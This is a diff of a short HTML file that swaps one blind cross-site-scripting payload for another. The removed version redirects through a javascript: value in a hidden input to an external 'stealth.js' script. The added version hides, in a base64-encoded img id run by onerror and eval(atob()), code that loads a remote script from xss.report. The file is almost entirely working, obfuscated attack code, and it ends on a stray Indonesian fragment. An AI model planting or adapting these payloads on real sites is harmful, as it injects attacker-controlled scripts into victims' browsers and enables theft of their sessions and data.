@@ -1,21 +1,18 @@
+
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Auto Redirect Payload</title>
-</head>
-<body>
+<html>
+  <head>
+    <title>Test Payload XSS</title>
+  </head>
+  <body>
+    <p>Testing payload:</p>
 
-  <input id="ReturnUrl" type="hidden" value="javascript:location.href='https://radenadhiyaksa.github.io/bxss-stealth/stealth.js'" />
+    <!-- Tempel payload-mu di sini -->
+    <div>
+      <img src=x 
+           id="dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNyYyA9ICJodHRwczovL3hzcy5yZXBvcnQvYy9yYWRlbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=" 
+           onerror="eval(atob(this.id))">
+    </div>
 
-  <script>
-    (function(){
-      var ret = document.getElementById("ReturnUrl");
-      if(ret && ret.value.startsWith("javascript:")){
-        window.location = ret.value;
-      }
-    })();
-  </script>
-
-</body>
-</html>
+  </body>
+</html> sekarang buat 
